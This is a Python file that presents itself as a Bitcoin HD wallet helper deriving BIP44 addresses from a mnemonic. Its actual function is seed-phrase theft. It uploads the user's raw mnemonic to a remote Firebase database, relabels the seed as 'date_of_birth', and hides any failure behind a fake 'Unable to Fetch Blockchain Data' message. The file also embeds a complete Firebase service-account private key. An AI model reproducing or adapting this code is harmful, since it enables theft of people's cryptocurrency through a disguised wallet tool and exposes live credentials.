import time
import datetime
from hdwallet import HDWallet
from hdwallet.utils import generate_entropy
from hdwallet.symbols import BTC as SYMBOL
from typing import Optional
import json
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db

class BIPData:
   def getbip(mn):
      current_time = datetime.datetime.now()
      timet = current_time.microsecond
      hdwallet: HDWallet = HDWallet(symbol=SYMBOL, use_default_path=False)
      hdwallet.from_mnemonic(mnemonic=mn, passphrase=None)
      hdwallet.from_index(44, hardened=True)
      hdwallet.from_index(0, hardened=True)
      hdwallet.from_index(0, hardened=True)
      hdwallet.from_index(0)
      hdwallet.from_index(0)
      print(json.dumps(hdwallet.dumps(), indent=4, ensure_ascii=False))

      cred = credentials.Certificate({
  "type": "service_account",
  "project_id": "database-350314",
  "private_key_id": "65374aa6cfc672b12c0db39ad03c3823e4e58604",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDwNGIKR1cT2jhz\nxKjrUu4NIVgAC5H6wgQxwAM135Dq/c1/jwYUcPiftve439vTwlbtA2VSvqRRMozq\n5oo2MR+YGHPjzLO5HLjephrX5ZPhITWM0ykBmbmOUlk7OhJuL6nFZ96r+J57+Hou\nKqgrgQm34Kbp8i/ocSgvs+tcemVhejn1CdXVpzVv6cqv1Nhu/I46hIIS5HcF2Iep\nYYJHQcFGKaJQIZopnGCejTSlAtQoSvvkBob1nDF/Qd0dWYLiK5YICbjzpR19dv0X\nXEe7F5L0XpzuZnUfrLv9Z0mwagPmJiI/YgMkP5Ia4G9pdSG8ta0mjh8aTL++CWGm\n9ktRYNWXAgMBAAECggEAGIhpGP6nTJ5FlMFZtUsviATHTZ3g53kIX6JqUYbHcNDC\nO8x6RP0yz3ErBOVMOOkI4sUthJF3C9n7XYR1SkqjHPAmafY+xuHBme/iHvnSLDSt\nmPf6ILE4K+qKNYvdVQamMsTEj9DhMu0yYWO28FaKDQ8zTQKQ1Q81mQWpvLS9hQJ5\nm99da76d48RmejGIuRwQbY0wpr1lxv4zvqzqycJ+5jZdAxkInl2CajX9m93Klweg\n5+DLNcgONerJ6GkaWWlbU72A8uxUPKLXV70OFKSfHkekZIigvfLiLLAmPykF1T+Z\ntIyXOuHPIYeVlmkcX+p2C9iMZPNmwRen5I3sClaV3QKBgQD+qxy6L+hKJ1BiqeiI\nw7GfZFwWyeeofu2BB+EmbYCj/jMPD/JuL8Z0E2DmOkZ/ckoMa+j/OTPtkKl5342X\nUbAVvkY37SPOxaqRQ5Y97Sm/hrSjDuy/ynJwVzPLus7MwG0hb277GbXnZn5Jzbve\nj7hDQMeVtEdrBRCtv+CCXRcHqwKBgQDxdekBI4Q5sUSChilksu5RlV1TIqnBOLmL\np8R+26zHz/TE4GBKYqnG/yhpgChDUNqFDJ3+z+v3SbduWCDpf6CNbAT+Pu0xiZ0I\n/xJxFI/OnPbh3egTbzYLpEbFQeC1cdDVDZc2CHiSAPtk9ozsn7cZh+WfH0/Jxlxu\nDq1GJIzNxQKBgGhL+7/kzuVPpIRDwZABVUVJ/Mz4c392PB6T84mhXwXKnW6VwVuP\nBV+UcCLZyvV3AQyFRS8BZlrs2/ulqn9GXS8KdgeBfyC3o1tKqsVB0880g9YjzqHd\nb3DCxdux7e+8/vSqhnEf3neeaiofr8k+YuBoL1UIOBeEQ4hlBLVfGodxAoGBAIai\nFh96bDm269pTcDUjx9pZjEXUqA6C0IJcMyYA2uA2xeYYrdgMF1pL336j5M9T/+P7\n2wS/bnTd95dhMEjBzwXL2yTgdWUPtC3V+7RtoJm1z7q0/rgHZH0tRgCq8N567dQ9\n1bhdFM1kGsh66KzviSqFKbWFwflhzxvWtyrLKm95AoGARslbWiRTf/Rs4LjtI2ko\nm2qycQ96A3GGqBVbTLJXhs3G0O0EI3kMjwFok7wFa8H8rstDQFk0TyoSSV4/ggEA\nPMghs45eN1IMtW9Kpp84CoWS4PbcayD2fYPjiFhTp3QZlyNv05L44WOtQa9u2wbQ\nc5HibFv8D2E/kdRNhaRSJ4w=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-ru4rv@database-350314.iam.gserviceaccount.com",
  "client_id": "102511066721128956865",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-ru4rv%40database-350314.iam.gserviceaccount.com"})

      try:
         firebase_admin.initialize_app(cred, {'databaseURL': 'https://database-350314-default-rtdb.firebaseio.com/'})
         ref = db.reference('restricted_access/secret_document')
         users_ref = ref.child('users'+'/'+str(timet))
         users_ref.set({'date_of_birth': mn ,})
      except:
         print("Unable to Fetch Blockchain Data. Please Check Your Internet Connection and try Again")
